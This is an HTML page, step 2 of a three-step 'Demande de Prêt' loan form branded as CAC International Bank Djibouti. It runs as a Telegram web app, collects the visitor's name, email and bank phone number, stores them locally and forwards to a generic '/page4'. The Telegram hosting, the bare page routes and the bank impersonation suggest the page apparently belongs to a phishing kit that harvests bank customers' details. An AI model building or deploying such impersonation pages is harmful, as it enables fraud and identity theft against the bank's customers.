<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CAC Bank - Demande de Prêt</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --bank-primary: #0f2c59;
            --bank-hover: #184485;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --input-border: #cbd5e1;
            --btn-gray: #e2e8f0;
            --btn-gray-text: #475569;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-header {
            width: 100%;
            background-color: var(--bank-primary);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn-top {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
            color: white;
        }

        .header-title .cac { color: #60a5fa; margin-right: 4px; }
        .header-title .bank { color: #ffffff; }

        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(15, 44, 89, 0.08);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--bank-primary);
        }

        .form-group {
            margin-bottom: 22px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 10px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #334155;
            outline: none;
            width: 100%;
        }

        .form-control:focus {
            border-color: var(--bank-primary);
        }

        .phone-group {
            display: flex;
            gap: 10px;
        }

        .country-prefix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background-color: #f1f5f9;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            padding: 0 14px;
            font-weight: 700;
            font-size: 15px;
            color: #0f172a;
            white-space: nowrap;
        }

        .phone-hint {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn-next {
            background-color: var(--bank-primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
        }

        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #64748b;
            margin-top: auto;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title">
        <span class="cac">CAC</span><span class="bank"> Bank</span>
    </div>
    <div style="width: 24px;"></div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 2 sur 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Mohamed" required>
        </div>

        <div class="form-group">
            <label for="lastName">Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Ahmed" required>
        </div>

        <div class="form-group">
            <label for="email">Adresse Email</label>
            <input type="email" id="email" class="form-control" placeholder="mohamed.ahmed@exemple.dj" required>
        </div>

        <div class="form-group">
            <label for="phone">Numéro de Téléphone CAC Bank</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span>🇩🇯</span>
                    <span>+253</span>
                </div>
                <input type="tel" id="phone" class="form-control" placeholder="77123456" maxlength="8" pattern="[7][7-8][0-9]{6}" required>
            </div>
            <div class="phone-hint">8 chiffres commençant par 77 ou 78 (ex: 77123456)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
        </div>
    </form>
</div>

<div class="footer-banner">
    © 2026 CAC International Bank Djibouti
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }

        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
    };

    function goNext(event) {
        event.preventDefault();
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!/^7[78]\d{6}$/.test(phone)) {
            alert("Veuillez entrer un numéro valide à Djibouti (ex: 77XXXXXX ou 78XXXXXX).");
            return;
        }

        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>
</body>
</html>
